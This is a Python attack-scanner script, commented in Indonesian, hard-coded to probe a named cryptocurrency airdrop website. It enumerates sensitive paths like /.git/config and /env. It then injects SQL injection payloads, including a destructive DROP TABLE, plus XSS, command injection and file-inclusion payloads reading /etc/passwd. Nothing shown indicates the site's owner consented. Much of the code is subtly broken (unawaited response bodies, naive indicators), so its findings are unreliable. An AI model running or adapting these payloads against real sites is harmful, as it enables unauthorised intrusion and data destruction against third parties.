#!/usr/bin/env python3
"""
Enhanced Vulnerability Scanner untuk 0G Foundation Airdrop
4-phase analisis kerentanan dengan injeksi payload aktif
"""

import asyncio
import json
import re
import time
import base64
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
import requests


class EnhancedVulnerabilityScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.scan_results = {}
        self.start_time = time.time()

    async def run_enhanced_analysis(self):
        """Jalankan 4-phase analisis kerentanan komprehensif"""
        print("üîç Memulai Enhanced Vulnerability Analysis")
        print("=" * 60)
        print(f"üéØ Target: {self.target_url}")
        print("=" * 60)

        results = {}

        # Phase 1: Discovery and Reconnaissance
        print("\nüïµÔ∏è Phase 1: Discovery and Reconnaissance")
        results["discovery"] = await self.discovery_phase()

        # Phase 2: Advanced Vulnerability Testing
        print("\n‚ö° Phase 2: Advanced Vulnerability Testing")
        results["vulnerability_testing"] = await self.vulnerability_testing_phase()

        # Phase 3: Response and Error Analysis
        print("\nüîç Phase 3: Response and Error Analysis")
        results["response_analysis"] = await self.response_analysis_phase()

        # Phase 4: Security Assessment and Recommendations
        print("\nüìä Phase 4: Security Assessment and Recommendations")
        results["security_assessment"] = await self.security_assessment_phase(results)

        # Generate final report
        results["summary"] = self.generate_summary_report(results)
        results["scan_duration"] = time.time() - self.start_time

        return results

    async def discovery_phase(self):
        """Phase 1: Discovery and Reconnaissance"""
        try:
            async with aiohttp.ClientSession() as session:
                self.session = session

                # Technology fingerprinting
                tech_result = await self.technology_fingerprinting()

                # Directory and file enumeration
                enum_result = await self.enumeration_phase()

                # Information gathering
                info_result = await self.information_gathering()

                return {
                    "technology_fingerprinting": tech_result,
                    "enumeration": enum_result,
                    "information_gathering": info_result,
                    "score": self.calculate_discovery_score([tech_result, enum_result, info_result])
                }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def technology_fingerprinting(self):
        """Fingerprinting teknologi yang digunakan"""
        try:
            response = await self.session.get(self.target_url)
            headers = dict(response.headers)
            content = response.text

            # Server detection
            server = headers.get('server', 'Unknown')
            x_powered_by = headers.get('x-powered-by', 'Unknown')

            # Technology detection
            tech_stack = []
            if 'next.js' in content.lower():
                tech_stack.append('Next.js')
            if 'react' in content.lower():
                tech_stack.append('React')
            if 'typescript' in content.lower():
                tech_stack.append('TypeScript')
            if 'tailwind' in content.lower():
                tech_stack.append('Tailwind CSS')
            if 'vue' in content.lower():
                tech_stack.append('Vue.js')
            if 'angular' in content.lower():
                tech_stack.append('Angular')

            # Framework detection
            frameworks = []
            if 'node.js' in x_powered_by.lower() or 'express' in content.lower():
                frameworks.append('Node.js/Express')
            if 'django' in content.lower():
                frameworks.append('Django')
            if 'flask' in content.lower():
                frameworks.append('Flask')

            return {
                "server": server,
                "x_powered_by": x_powered_by,
                "technologies": tech_stack,
                "frameworks": frameworks,
                "score": 80  # Good reconnaissance
            }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def enumeration_phase(self):
        """Enumerasi direktori dan file"""
        try:
            # Common directories to check
            directories = [
                '/admin', '/login', '/dashboard', '/api', '/docs',
                '/backup', '/config', '/test', '/dev', '/staging'
            ]

            # Common files to check
            files = [
                '/robots.txt', '/sitemap.xml', '/.git/config',
                '/config.php', '/wp-config.php', '/env'
            ]

            found_directories = []
            found_files = []

            for directory in directories:
                try:
                    response = await self.session.get(urljoin(self.target_url, directory))
                    if response.status < 400:
                        found_directories.append(directory)
                except:
                    pass

            for file in files:
                try:
                    response = await self.session.get(urljoin(self.target_url, file))
                    if response.status < 400:
                        found_files.append(file)
                except:
                    pass

            # Calculate score (lower is better for enumeration)
            score = max(0, 100 - (len(found_directories) + len(found_files)) * 5)

            return {
                "directories_tested": len(directories),
                "directories_found": len(found_directories),
                "directories_found_list": found_directories,
                "files_tested": len(files),
                "files_found": len(found_files),
                "files_found_list": found_files,
                "score": score
            }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def information_gathering(self):
        """Pengumpulan informasi"""
        try:
            response = await self.session.get(self.target_url)
            content = response.text

            # Email extraction
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            emails = re.findall(email_pattern, content)

            # Phone number extraction
            phone_pattern = r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'
            phones = re.findall(phone_pattern, content)

            # Comments extraction
            comments = re.findall(r'<!--.*?-->', content, re.DOTALL)

            # Internal links
            internal_links = re.findall(r'href="(/[^"]*)"', content)

            # External links
            external_links = re.findall(r'href="https?://[^"]*"', content)

            # API endpoints
            api_endpoints = re.findall(r'api/[^/\s\'"<>]+', content)

            return {
                "emails_found": len(emails),
                "emails": emails[:5],  # Show first 5
                "phones_found": len(phones),
                "phones": phones,
                "comments_found": len(comments),
                "comments": [comment[:50] + "..." for comment in comments[:3]],  # Show first 3 comments
                "internal_links": len(internal_links),
                "external_links": len(external_links),
                "api_endpoints": len(api_endpoints),
                "api_endpoints_list": api_endpoints[:10],  # Show first 10
                "score": 60  # Information found
            }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def vulnerability_testing_phase(self):
        """Phase 2: Advanced Vulnerability Testing"""
        try:
            # SQL Injection Testing
            sql_result = await self.sql_injection_testing()

            # XSS Testing
            xss_result = await self.xss_testing()

            # Command Injection Testing
            cmd_result = await self.command_injection_testing()

            # File Inclusion Testing
            file_result = await self.file_inclusion_testing()

            # CSRF Testing
            csrf_result = await self.csrf_testing()

            return {
                "sql_injection": sql_result,
                "xss": xss_result,
                "command_injection": cmd_result,
                "file_inclusion": file_result,
                "csrf": csrf_result,
                "score": self.calculate_vulnerability_score([
                    sql_result, xss_result, cmd_result, file_result, csrf_result
                ])
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def sql_injection_testing(self):
        """Testing SQL Injection"""
        try:
            sql_payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' WAITFOR DELAY '0:0:5'--",
                "'; DROP TABLE users--"
            ]

            vulnerable_endpoints = []
            tested_endpoints = []

            # Test common endpoints
            endpoints = ["/login", "/api/auth", "/search", "/filter"]

            for endpoint in endpoints:
                for payload in sql_payloads:
                    try:
                        data = {"username": payload, "password": payload}
                        response = await self.session.post(urljoin(self.target_url, endpoint), data=data)

                        # Check for SQL injection indicators
                        indicators = [
                            "sql syntax",
                            "mysql_fetch",
                            "ora-",
                            "postgresql",
                            "sqlite",
                            "error in your sql syntax"
                        ]

                        for indicator in indicators:
                            if indicator in response.text.lower():
                                vulnerable_endpoints.append(f"{endpoint} - {payload}")
                                break

                    except:
                        pass

            # Calculate score (lower is better for vulnerabilities)
            vulnerability_count = len(vulnerable_endpoints)
            score = max(0, 100 - vulnerability_count * 20)

            return {
                "endpoints_tested": len(endpoints) * len(sql_payloads),
                "vulnerable_endpoints": vulnerability_count,
                "vulnerable_details": vulnerable_endpoints,
                "tested_endpoints": tested_endpoints,
                "score": score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def xss_testing(self):
        """Testing Cross-Site Scripting"""
        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>"
            ]

            vulnerable_endpoints = []
            tested_inputs = []

            # Test form inputs
            inputs_to_test = ["search", "q", "query", "username", "email", "message"]

            for input_name in inputs_to_test:
                for payload in xss_payloads:
                    try:
                        data = {input_name: payload}
                        response = await self.session.post(self.target_url, data=data)

                        # Check for XSS reflection
                        if payload.replace("'", '"') in response.text:
                            vulnerable_endpoints.append(f"Input '{input_name}' reflected")
                            break

                    except:
                        pass

            # Calculate score
            vulnerability_count = len(vulnerable_endpoints)
            score = max(0, 100 - vulnerability_count * 25)

            return {
                "inputs_tested": len(inputs_to_test) * len(xss_payloads),
                "vulnerable_inputs": vulnerability_count,
                "vulnerable_details": vulnerable_endpoints,
                "score": score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def command_injection_testing(self):
        """Testing Command Injection"""
        try:
            cmd_payloads = [
                "| whoami",
                "|| dir",
                "& net user",
                "; ls -la",
                "$(cat /etc/passwd)",
                "`id`",
                "&& ping -c 1 127.0.0.1"
            ]

            vulnerable_endpoints = []
            tested_parameters = []

            # Test command injection parameters
            cmd_params = ["cmd", "command", "exec", "shell", "system"]

            for param in cmd_params:
                for payload in cmd_payloads:
                    try:
                        data = {param: payload}
                        response = await self.session.post(self.target_url, data=data)

                        # Check for command execution indicators
                        indicators = [
                            "root",
                            "windows",
                            "system32",
                            "command not found",
                            "access denied"
                        ]

                        for indicator in indicators:
                            if indicator in response.text.lower():
                                vulnerable_endpoints.append(f"Parameter '{param}' vulnerable")
                                break

                    except:
                        pass

            # Calculate score
            vulnerability_count = len(vulnerable_endpoints)
            score = max(0, 100 - vulnerability_count * 30)

            return {
                "parameters_tested": len(cmd_params) * len(cmd_payloads),
                "vulnerable_parameters": vulnerability_count,
                "vulnerable_details": vulnerable_endpoints,
                "score": score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def file_inclusion_testing(self):
        """Testing File Inclusion"""
        try:
            file_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd",
                "zip://archive.zip%23malicious.txt"
            ]

            vulnerable_endpoints = []

            # Test file inclusion in various parameters
            file_params = ["file", "page", "template", "include", "view"]

            for param in file_params:
                for payload in file_payloads:
                    try:
                        data = {param: payload}
                        response = await self.session.post(self.target_url, data=data)

                        # Check for file inclusion indicators
                        indicators = [
                            "root:",
                            "hosts",
                            "permission denied",
                            "no such file",
                            "failed to open"
                        ]

                        for indicator in indicators:
                            if indicator in response.text.lower():
                                vulnerable_endpoints.append(f"Parameter '{param}' vulnerable")
                                break

                    except:
                        pass

            # Calculate score
            vulnerability_count = len(vulnerable_endpoints)
            score = max(0, 100 - vulnerability_count * 25)

            return {
                "parameters_tested": len(file_params) * len(file_payloads),
                "vulnerable_parameters": vulnerability_count,
                "vulnerable_details": vulnerable_endpoints,
                "score": score
            }

        except Exception as e:
            return {"error": str(e), "score": 100}

    async def csrf_testing(self):
        """Testing CSRF"""
        try:
            # Check for CSRF tokens in forms
            response = await self.session.get(self.target_url)
            content = response.text

            # Look for CSRF protection patterns
            csrf_patterns = [
                r'name="csrf[_-]?token"',
                r'name="[_-]?token"',
                r'value="[^"]*"',
                r'csrfmiddlewaretoken'
            ]

            csrf_protection = []
            for pattern in csrf_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    csrf_protection.append(f"Found: {pattern}")

            # Check for SameSite cookies
            cookies = response.cookies
            samesite_cookies = [cookie for cookie in cookies if cookie.get('samesite')]

            # Calculate score
            csrf_score = 80 if csrf_protection else 40
            csrf_score += 10 if samesite_cookies else 0

            return {
                "csrf_protection_found": len(csrf_protection),
                "csrf_protection_details": csrf_protection,
                "samesite_cookies": len(samesite_cookies),
                "cookie_details": [str(cookie) for cookie in samesite_cookies[:3]],
                "score": min(csrf_score, 100)
            }

        except Exception as e:
            return {"error": str(e), "score": 60}

    async def response_analysis_phase(self):
        """Phase 3: Response and Error Analysis"""
        try:
            # Error message analysis
            error_result = await self.error_message_analysis()

            # Response time analysis
            timing_result = await self.response_timing_analysis()

            # Header analysis
            header_result = await self.response_header_analysis()

            # Cookie security analysis
            cookie_result = await self.cookie_analysis()

            return {
                "error_analysis": error_result,
                "timing_analysis": timing_result,
                "header_analysis": header_result,
                "cookie_analysis": cookie_result,
                "score": self.calculate_response_score([
                    error_result, timing_result, header_result, cookie_result
                ])
            }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def error_message_analysis(self):
        """Analisis error messages"""
        try:
            # Trigger errors with invalid requests
            error_requests = [
                self.session.get(urljoin(self.target_url, "/invalid")),
                self.session.post(self.target_url, data={"invalid": "data"}),
                self.session.get(urljoin(self.target_url, "/404"))
            ]

            error_messages = []
            tested_requests = []

            for request in error_requests:
                try:
                    response = await request
                    error_content = response.text

                    # Check for verbose error messages
                    if any(indicator in error_content.lower() for indicator in [
                        "mysql_fetch_array",
                        "pg_query",
                        "oci_parse",
                        "mssql_query",
                        "sqlite_exec"
                    ]):
                        error_messages.append("Verbose database error found")

                    if any(indicator in error_content.lower() for indicator in [
                        "stack trace",
                        "traceback",
                        "function:",
                        "line "
                    ]):
                        error_messages.append("Verbose stack trace found")

                except Exception as e:
                    error_messages.append(f"Connection error: {str(e)}")

            # Calculate score (lower is better for verbose errors)
            score = max(0, 100 - len(error_messages) * 15)

            return {
                "requests_tested": len(error_requests),
                "error_messages_found": len(error_messages),
                "error_details": error_messages,
                "score": score
            }

        except Exception as e:
            return {"error": str(e), "score": 70}

    async def response_timing_analysis(self):
        """Analisis response timing"""
        try:
            # Make multiple requests to check timing consistency
            response_times = []
            for i in range(5):
                start_time = time.time()
                try:
                    response = await self.session.get(self.target_url)
                    end_time = time.time()
                    response_times.append(end_time - start_time)
                except:
                    response_times.append(0)

            # Calculate timing statistics
            avg_time = sum(response_times) / len(response_times)
            max_time = max(response_times)
            min_time = min([t for t in response_times if t > 0], default=0)

            # Check for potential timing attacks
            timing_variance = max_time - min_time if max_time > 0 else 0

            # Calculate score (consistent timing is better)
            timing_score = 80 if timing_variance < 1 else 60

            return {
                "requests_made": len(response_times),
                "average_response_time": avg_time,
                "max_response_time": max_time,
                "min_response_time": min_time,
                "timing_variance": timing_variance,
                "score": timing_score
            }

        except Exception as e:
            return {"error": str(e), "score": 50}

    async def response_header_analysis(self):
        """Analisis response headers"""
        try:
            response = await self.session.get(self.target_url)
            headers = dict(response.headers)

            security_headers = {
                "content_security_policy": headers.get('content-security-policy', 'Not Set'),
                "strict_transport_security": headers.get('strict-transport-security', 'Not Set'),
                "x_frame_options": headers.get('x-frame-options', 'Not Set'),
                "x_content_type_options": headers.get('x-content-type-options', 'Not Set'),
                "x_xss_protection": headers.get('x-xss-protection', 'Not Set'),
                "referrer_policy": headers.get('referrer-policy', 'Not Set'),
                "permissions_policy": headers.get('permissions-policy', 'Not Set')
            }

            # Calculate security header score
            score = 0
            for header, value in security_headers.items():
                if value != 'Not Set':
                    score += 14  # 100 / 7 ‚âà 14

            return {
                "security_headers": security_headers,
                "headers_found": sum(1 for h in security_headers.values() if h != 'Not Set'),
                "total_headers": len(security_headers),
                "score": min(score, 100)
            }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def cookie_analysis(self):
        """Analisis cookie security"""
        try:
            response = await self.session.get(self.target_url)
            cookies = response.cookies

            cookie_security = {
                "total_cookies": len(cookies),
                "secure_cookies": 0,
                "httponly_cookies": 0,
                "samesite_cookies": 0,
                "session_cookies": 0,
                "persistent_cookies": 0
            }

            for cookie in cookies:
                if cookie.secure:
                    cookie_security["secure_cookies"] += 1
                if cookie.get('httponly'):
                    cookie_security["httponly_cookies"] += 1
                if cookie.get('samesite'):
                    cookie_security["samesite_cookies"] += 1

                # Check if session cookie (no expiry)
                if not cookie.get('expires'):
                    cookie_security["session_cookies"] += 1
                else:
                    cookie_security["persistent_cookies"] += 1

            # Calculate cookie security score
            score = 50  # Base score
            score += cookie_security["secure_cookies"] * 15
            score += cookie_security["httponly_cookies"] * 15
            score += cookie_security["samesite_cookies"] * 10

            return {
                "cookie_security": cookie_security,
                "score": min(score, 100)
            }

        except Exception as e:
            return {"error": str(e), "score": 0}

    async def security_assessment_phase(self, previous_results):
        """Phase 4: Security Assessment and Recommendations"""
        try:
            # CVSS Score Calculation
            cvss_result = self.calculate_cvss_scores(previous_results)

            # Risk Assessment
            risk_result = self.assess_risk_levels(previous_results)

            # Vulnerability Prioritization
            priority_result = self.prioritize_vulnerabilities(previous_results)

            # Recommendations
            recommendations = self.generate_security_recommendations(previous_results)

            return {
                "cvss_scores": cvss_result,
                "risk_assessment": risk_result,
                "vulnerability_priorities": priority_result,
                "recommendations": recommendations,
                "score": self.calculate_assessment_score([
                    cvss_result, risk_result, priority_result, recommendations
                ])
            }

        except Exception as e:
            return {"error": str(e), "score": 0}

    def calculate_cvss_scores(self, results):
        """Hitung CVSS scores"""
        try:
            cvss_scores = {}

            # SQL Injection CVSS
            sql_score = results.get('vulnerability_testing', {}).get('sql_injection', {}).get('score', 100)
            cvss_scores['sql_injection'] = {
                'base_score': max(0, 9.8 - (100 - sql_score) * 0.1),
                'severity': 'Critical' if sql_score < 20 else 'High' if sql_score < 50 else 'Medium' if sql_score < 80 else 'Low'
            }

            # XSS CVSS
            xss_score = results.get('vulnerability_testing', {}).get('xss', {}).get('score', 100)
            cvss_scores['xss'] = {
                'base_score': max(0, 8.8 - (100 - xss_score) * 0.09),
                'severity': 'High' if xss_score < 30 else 'Medium' if xss_score < 60 else 'Low'
            }

            # Command Injection CVSS
            cmd_score = results.get('vulnerability_testing', {}).get('command_injection', {}).get('score', 100)
            cvss_scores['command_injection'] = {
                'base_score': max(0, 9.0 - (100 - cmd_score) * 0.1),
                'severity': 'Critical' if cmd_score < 20 else 'High' if cmd_score < 50 else 'Medium' if cmd_score < 80 else 'Low'
            }

            return cvss_scores

        except Exception as e:
            return {"error": str(e)}

    def assess_risk_levels(self, results):
        """Tingkatkan risiko"""
        try:
            risk_levels = {
                "overall_risk": "Low",
                "risk_by_category": {},
                "risk_factors": [],
                "mitigation_priority": "Low"
            }

            # Assess risk by category
            categories = [
                ("discovery", "Information Disclosure"),
                ("vulnerability_testing", "Vulnerabilities"),
                ("response_analysis", "Error Handling")
            ]

            for category_name, category_desc in categories:
                category_score = results.get(category_name, {}).get('score', 100)
                if category_score < 40:
                    risk_levels["risk_by_category"][category_desc] = "Critical"
                    risk_levels["risk_factors"].append(f"{category_desc}: Critical Risk")
                elif category_score < 60:
                    risk_levels["risk_by_category"][category_desc] = "High"
                    risk_levels["risk_factors"].append(f"{category_desc}: High Risk")
                elif category_score < 80:
                    risk_levels["risk_by_category"][category_desc] = "Medium"
                    risk_levels["risk_factors"].append(f"{category_desc}: Medium Risk")
                else:
                    risk_levels["risk_by_category"][category_desc] = "Low"

            # Determine overall risk
            if any(risk == "Critical" for risk in risk_levels["risk_by_category"].values()):
                risk_levels["overall_risk"] = "Critical"
                risk_levels["mitigation_priority"] = "Critical"
            elif any(risk == "High" for risk in risk_levels["risk_by_category"].values()):
                risk_levels["overall_risk"] = "High"
                risk_levels["mitigation_priority"] = "High"
            elif any(risk == "Medium" for risk in risk_levels["risk_by_category"].values()):
                risk_levels["overall_risk"] = "Medium"
                risk_levels["mitigation_priority"] = "Medium"

            return risk_levels

        except Exception as e:
            return {"error": str(e)}

    def prioritize_vulnerabilities(self, results):
        """Prioritaskan kerentanan"""
        try:
            vulnerabilities = []

            # Add SQL Injection vulnerabilities
            sql_result = results.get('vulnerability_testing', {}).get('sql_injection', {})
            if sql_result.get('vulnerable_endpoints', 0) > 0:
                vulnerabilities.append({
                    'type': 'SQL Injection',
                    'severity': 'Critical',
                    'count': sql_result.get('vulnerable_endpoints', 0),
                    'priority': 1
                })

            # Add XSS vulnerabilities
            xss_result = results.get('vulnerability_testing', {}).get('xss', {})
            if xss_result.get('vulnerable_inputs', 0) > 0:
                vulnerabilities.append({
                    'type': 'Cross-Site Scripting',
                    'severity': 'High',
                    'count': xss_result.get('vulnerable_inputs', 0),
                    'priority': 2
                })

            # Add Command Injection vulnerabilities
            cmd_result = results.get('vulnerability_testing', {}).get('command_injection', {})
            if cmd_result.get('vulnerable_parameters', 0) > 0:
                vulnerabilities.append({
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'count': cmd_result.get('vulnerable_parameters', 0),
                    'priority': 1
                })

            # Sort by priority
            vulnerabilities.sort(key=lambda x: x['priority'])

            return {
                "vulnerabilities": vulnerabilities,
                "total_vulnerabilities": sum(v['count'] for v in vulnerabilities),
                "critical_vulnerabilities": sum(1 for v in vulnerabilities if v['severity'] == 'Critical'),
                "high_vulnerabilities": sum(1 for v in vulnerabilities if v['severity'] == 'High')
            }

        except Exception as e:
            return {"error": str(e)}

    def generate_security_recommendations(self, results):
        """Generate rekomendasi keamanan"""
        try:
                recommendations = []

                # General security recommendations
                recommendations.append("Implement comprehensive input validation")
                recommendations.append("Use parameterized queries to prevent SQL injection")
                recommendations.append("Implement Content Security Policy (CSP)")
                recommendations.append("Add security headers (HSTS, X-Frame-Options, etc.)")
                recommendations.append("Implement proper error handling")

                # Specific recommendations based on findings
                sql_vuln = results.get('vulnerability_testing', {}).get('sql_injection', {}).get('vulnerable_endpoints', 0)
                if sql_vuln > 0:
                    recommendations.append(f"Fix {sql_vuln} SQL injection vulnerabilities")

                xss_vuln = results.get('vulnerability_testing', {}).get('xss', {}).get('vulnerable_inputs', 0)
                if xss_vuln > 0:
                    recommendations.append(f"Fix {xss_vuln} XSS vulnerabilities")

                cmd_vuln = results.get('vulnerability_testing', {}).get('command_injection', {}).get('vulnerable_parameters', 0)
                if cmd_vuln > 0:
                    recommendations.append(f"Fix {cmd_vuln} command injection vulnerabilities")

                # Cookie security recommendations
                cookie_result = results.get('response_analysis', {}).get('cookie_analysis', {})
                if cookie_result:
                    security = cookie_result.get('cookie_security', {})
                    if security.get('secure_cookies', 0) == 0:
                        recommendations.append("Implement secure flag for all cookies")
                    if security.get('httponly_cookies', 0) == 0:
                        recommendations.append("Implement HttpOnly flag for all cookies")
                    if security.get('samesite_cookies', 0) == 0:
                        recommendations.append("Implement SameSite attribute for all cookies")

                # Header security recommendations
                header_result = results.get('response_analysis', {}).get('header_analysis', {})
                if header_result:
                    headers = header_result.get('security_headers', {})
                    missing_headers = [k for k, v in headers.items() if v == 'Not Set']
                    if missing_headers:
                        recommendations.append(f"Implement missing security headers: {', '.join(missing_headers)}")

                return recommendations

        except Exception as e:
            return {"error": str(e)}

    def calculate_discovery_score(self, results):
        """Hitung skor discovery phase"""
        scores = [r.get('score', 0) for r in results if isinstance(r, dict) and 'score' in r]
        return sum(scores) / len(scores) if scores else 0

    def calculate_vulnerability_score(self, results):
        """Hitung skor vulnerability testing"""
        scores = [r.get('score', 100) for r in results if isinstance(r, dict) and 'score' in r]
        return sum(scores) / len(scores) if scores else 100

    def calculate_response_score(self, results):
        """Hitung skor response analysis"""
        scores = [r.get('score', 0) for r in results if isinstance(r, dict) and 'score' in r]
        return sum(scores) / len(scores) if scores else 0

    def calculate_assessment_score(self, results):
        """Hitung skor security assessment"""
        scores = [r.get('score', 0) for r in results if isinstance(r, dict) and 'score' in r]
        return sum(scores) / len(scores) if scores else 0

    def generate_summary_report(self, results):
        """Generate summary report"""
        summary = {
            "phases_completed": 0,
            "overall_score": 0,
            "risk_level": "Unknown",
            "total_vulnerabilities": 0,
            "critical_vulnerabilities": 0,
            "high_vulnerabilities": 0,
            "recommendations": [],
            "next_steps": []
        }

        # Calculate overall score
        all_scores = []
        for phase_name, phase_data in results.items():
            if isinstance(phase_data, dict) and 'score' in phase_data:
                all_scores.append(phase_data['score'])
                summary["phases_completed"] += 1

        if all_scores:
            summary["overall_score"] = sum(all_scores) / len(all_scores)

        # Count vulnerabilities
        vuln_priorities = results.get('security_assessment', {}).get('vulnerability_priorities', {})
        summary["total_vulnerabilities"] = vuln_priorities.get('total_vulnerabilities', 0)
        summary["critical_vulnerabilities"] = vuln_priorities.get('critical_vulnerabilities', 0)
        summary["high_vulnerabilities"] = vuln_priorities.get('high_vulnerabilities', 0)

        # Determine risk level
        if summary["overall_score"] >= 80:
            summary["risk_level"] = "Low"
        elif summary["overall_score"] >= 60:
            summary["risk_level"] = "Medium"
        elif summary["overall_score"] >= 40:
            summary["risk_level"] = "High"
        else:
            summary["risk_level"] = "Critical"

        # Generate next steps
        if summary["critical_vulnerabilities"] > 0:
            summary["next_steps"].append("Address critical vulnerabilities immediately")
        if summary["high_vulnerabilities"] > 0:
            summary["next_steps"].append("Fix high-priority vulnerabilities")
        if summary["overall_score"] < 60:
            summary["next_steps"].append("Implement security improvements")

        # Add recommendations
        recommendations = results.get('security_assessment', {}).get('recommendations', [])
        summary["recommendations"] = recommendations

        return summary

    async def save_report(self, results):
        """Save report to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"enhanced_vulnerability_scan_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)

        print(f"üìä Report saved to: {filename}")
        return filename


async def main():
    """Main execution function"""
    target_url = "https://airdrop.0gfoundation.ai"

    print("üîç Enhanced Vulnerability Scanner")
    print("=" * 60)
    print(f"üéØ Target: {target_url}")
    print("=" * 60)

    scanner = EnhancedVulnerabilityScanner(target_url)
    results = await scanner.run_enhanced_analysis()

    if results:
        # Save report
        await scanner.save_report(results)

        print(f"\n‚úÖ Enhanced Vulnerability Analysis completed!")
        print(f"üìä Overall Score: {results['summary']['overall_score']:.1f}/100")
        print(f"üéØ Risk Level: {results['summary']['risk_level']}")
        print(f"üìã Total Vulnerabilities: {results['summary']['total_vulnerabilities']}")
        print(f"üö® Critical Vulnerabilities: {results['summary']['critical_vulnerabilities']}")
        print(f"‚ö†Ô∏è High Vulnerabilities: {results['summary']['high_vulnerabilities']}")
        print(f"‚è±Ô∏è Scan Duration: {results['scan_duration']:.2f} seconds")

        return results
    else:
        print("‚ùå Analysis failed!")
        return None


if __name__ == "__main__":
    asyncio.run(main())